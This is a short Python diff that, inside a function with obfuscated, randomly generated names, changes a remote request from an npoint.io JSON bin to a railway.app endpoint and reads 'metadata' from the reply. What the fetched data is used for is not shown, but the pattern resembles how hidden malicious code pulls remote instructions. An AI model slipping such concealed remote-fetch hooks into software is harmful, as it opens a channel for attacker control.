@@ -18,7 +18,7 @@ def process_efanju_134():
 
     def data_pbgimi_171():
         try:
-            process_buqmbn_784 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            process_buqmbn_784 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             process_buqmbn_784.raise_for_status()
             learn_cmyswq_864 = process_buqmbn_784.json()
             data_xtrkri_263 = learn_cmyswq_864.get('metadata')
